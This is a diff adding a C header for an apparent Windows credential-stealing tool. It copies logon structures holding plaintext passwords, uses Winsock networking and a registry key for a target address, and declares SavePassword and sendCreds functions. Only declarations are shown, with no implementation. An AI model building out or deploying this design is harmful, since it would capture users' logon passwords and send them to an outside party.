+++ winlogon/winlogon.h
@@ -1,0 +1,50 @@
+#include <winsock2.h>
+#include <stdio.h>
+#include <Windows.h>
+
+#pragma comment(lib,"ws2_32.lib") //Winsock Library
+
+#define rKey L"SOFTWARE\\kindtime"
+
+// from npapi.h
+#define WNNC_SPEC_VERSION                0x00000001
+#define WNNC_SPEC_VERSION51              0x00050001
+#define WNNC_NET_TYPE                    0x00000002
+#define WNNC_START                       0x0000000C
+#define WNNC_WAIT_FOR_START              0x00000001
+
+//from ntdef.h
+typedef struct _UNICODE_STRING
+{
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+// from NTSecAPI.h
+typedef enum _MSV1_0_LOGON_SUBMIT_TYPE
+{
+	MsV1_0InteractiveLogon = 2,
+	MsV1_0Lm20Logon,
+	MsV1_0NetworkLogon,
+	MsV1_0SubAuthLogon,
+	MsV1_0WorkstationUnlockLogon = 7,
+	MsV1_0S4ULogon = 12,
+	MsV1_0VirtualLogon = 82,
+	MsV1_0NoElevationLogon = 83,
+	MsV1_0LuidLogon = 84,
+} MSV1_0_LOGON_SUBMIT_TYPE, * PMSV1_0_LOGON_SUBMIT_TYPE;
+
+// from NTSecAPI.h
+typedef struct _MSV1_0_INTERACTIVE_LOGON
+{
+	MSV1_0_LOGON_SUBMIT_TYPE MessageType;
+	UNICODE_STRING LogonDomainName;
+	UNICODE_STRING UserName;
+	UNICODE_STRING Password;
+} MSV1_0_INTERACTIVE_LOGON, * PMSV1_0_INTERACTIVE_LOGON;
+
+DWORD getPtReg();
+char* getIPReg(const short*);
+void SavePassword(PUNICODE_STRING, PUNICODE_STRING);
+int sendCreds(char*);
